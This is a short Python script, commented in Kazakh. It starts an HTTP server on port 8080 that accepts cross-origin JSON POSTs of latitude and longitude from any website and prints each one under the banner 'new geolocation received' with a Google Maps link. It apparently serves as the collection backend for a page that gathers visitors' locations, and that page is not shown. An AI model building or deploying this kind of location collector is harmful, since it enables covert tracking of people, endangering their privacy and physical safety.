import json
from http.server import HTTPServer, SimpleHTTPRequestHandler

class GeoHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        # Басқа веб-сайттардан сұраныс қабылдауға рұқсат (CORS)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        
        # Келген деректі оқу
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            print("\n" + "="*40)
            print("   [+] ЖАҢА ГЕОЛОКАЦИЯ ТҮСТІ!   ")
            print("="*40)
            print(f"Ендік (Latitude):  {data.get('lat')}")
            print(f"Бойлық (Longitude): {data.get('lon')}")
            print(f"Карта сілтемесі:  https://maps.google.com/?q={data.get('lat')},{data.get('lon')}")
            print("="*40 + "\n")
        except Exception as e:
            print(f"Деректі оқуда қате шықты: {e}")
            
        self.wfile.write(b'{"status": "success"}')

print("Сервер http://localhost:8080 мекенжайында іске қосылды...")
server = HTTPServer(('0.0.0.0', 8080), GeoHandler)
server.serve_forever()
